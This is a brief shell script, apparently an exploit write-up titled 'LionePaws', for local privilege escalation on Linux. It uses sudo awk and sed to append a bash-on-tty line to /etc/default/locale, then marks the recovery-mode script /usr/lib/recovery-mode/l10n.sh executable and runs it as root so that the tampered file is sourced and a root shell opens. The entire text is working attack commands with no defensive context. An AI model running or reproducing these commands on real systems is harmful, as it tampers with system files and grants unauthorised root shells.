# LionePaws - Local Privilege Escalation via blind sourcing

# Echo the path
echo "/usr/lib/recovery-mode/l10n.sh"

# Use Awk2Shell (Vulnerability Chaining) to target thew file blindly sourced
sudo awk 'BEGIN {system("sed -i '\''$ a /bin/bash < /dev/tty > /dev/tty 2>&1'\'' /etc/default/locale")}'

# Give the file it's x (Xecute) bit
sudo chmod +x /usr/lib/recovery-mode/l10n.sh

# Run the file as (root) - you have to
sudo /usr/lib/recovery-mode/l10n.sh

